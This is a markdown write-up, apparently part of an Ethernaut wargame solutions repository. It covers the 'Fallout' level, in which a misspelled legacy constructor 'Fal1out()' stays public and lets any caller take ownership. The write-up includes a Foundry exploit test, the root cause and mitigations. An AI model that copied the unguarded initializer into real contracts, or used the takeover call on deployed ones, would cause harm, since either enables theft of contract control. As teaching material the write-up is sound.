# 02. Fallout

[English](02_Fallout.md) | [한국어](../ko/02_Fallout.md)

## Objective

Take ownership of the `Fallout` contract.

## Key Concepts

- Constructor syntax and historical naming conventions
- Unprotected initialization
- Function-name typos in privileged logic
- `msg.sender`-based ownership
- Testing legacy Solidity artifacts with modern Foundry
- ABI-compatible interfaces and `deployCode()`

## Contract Analysis

### Historical Constructor Syntax

Before Solidity 0.4.22, the language did not use the dedicated `constructor` keyword. A function whose name exactly matched the contract name was treated as the constructor and ran only during deployment.

```solidity
contract Fallout {
    function Fallout() public {
        owner = msg.sender;
    }
}
```

In that historical syntax, `Fallout()` was the constructor because its name exactly matched `contract Fallout`.

This approach was dangerous because constructor behavior depended on a case-sensitive function name. Renaming the contract without renaming the function, or introducing a small typo, silently turned the intended constructor into an ordinary public function.

Solidity 0.4.22 introduced the explicit `constructor` keyword to make initialization unambiguous. The old name-based syntax was deprecated and became disallowed in Solidity 0.5.0.

Modern constructor syntax separates the role from the contract name:

```solidity
contract Fallout {
    constructor() {
        owner = msg.sender;
    }
}
```

### Why Is the Function Named `Fal1out`?

The challenge's function name is designed to look almost identical to `Fallout`, but it replaces one lowercase letter `l` with the digit `1`:

```text
Contract: Fallout
Function: Fal1out
               ↑ digit 1
```

The intended name-based constructor would have been `Fallout()`. Because `Fal1out()` does not exactly match the contract name, an old compiler would treat it as a normal function rather than a constructor.

The reproduced level uses Solidity 0.6, where name-based constructors are no longer supported at all. Therefore, even apart from the typo, only the explicit `constructor` keyword can create a constructor. The misspelled function remains in the level to demonstrate the historical vulnerability.

### Vulnerable Initializer

The contract contains a function labeled as its constructor:

```solidity
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

This function is not a constructor. It is an ordinary `public payable` function that remains callable after deployment.

Any address can invoke `Fal1out()` and overwrite `owner` with its own address. Because there is no one-time initialization guard or access control, the function can also be called repeatedly.

## Exploit Flow

```text
Deploy the Fallout contract
        ↓
The intended initializer remains publicly callable
        ↓
Attacker calls Fal1out() with 1 wei
        ↓
owner = attacker
        ↓
Ownership takeover confirmed
```

## Foundry Exploit

```solidity
function testExploit() public {
    vm.startPrank(attacker);

    falloutContract.Fal1out{value: 1 wei}();

    assertEq(falloutContract.owner(), attacker);

    vm.stopPrank();
}
```

The ETH value is not required to become the owner, but sending `1 wei` also demonstrates that the function records the caller's allocation.

## Testing Solidity 0.6 with Modern forge-std

The vulnerable contract uses Solidity 0.6, while the installed forge-std version requires Solidity 0.8.13 or later. Importing both into the same test compilation unit would create incompatible compiler constraints.

The test instead declares a minimal Solidity 0.8 interface:

```solidity
interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}
```

Foundry compiles the legacy contract separately, and the test deploys its artifact directly:

```solidity
falloutContract = IFallout(deployCode("02_Fallout.sol:Fallout"));
```

This preserves the original compiler version and vulnerable behavior while allowing the test harness to use the current forge-std library.

## Root Cause

Privileged initialization logic was exposed as an unrestricted public function instead of a constructor. The function assigns ownership solely from `msg.sender` and does not verify whether initialization has already occurred.

The broader lesson is that naming conventions are not security controls. Initialization must use language-level constructor or initializer mechanisms with explicit access and one-time execution guarantees. This class of issue is especially dangerous because the code can look like it contains a constructor during a quick visual review while the deployed bytecode exposes a public function.

## Recommended Mitigations

- Use the `constructor` keyword for deployment-time initialization.
- Do not rely on a function name to provide constructor behavior.
- For proxy-based systems, protect initializer functions with a one-time initialization guard.
- Add tests confirming that initialization cannot be repeated.
- Use established ownership components such as OpenZeppelin's `Ownable` where appropriate.

## Run the Test

```bash
forge test --match-path test/02_Fallout.t.sol -vvv
```

To inspect the complete call trace:

```bash
forge test --match-path test/02_Fallout.t.sol -vvvv
```

## Takeaway

A single character in privileged initialization logic can expose complete ownership control. Constructors and initializers must be reviewed as part of the contract's access-control surface.
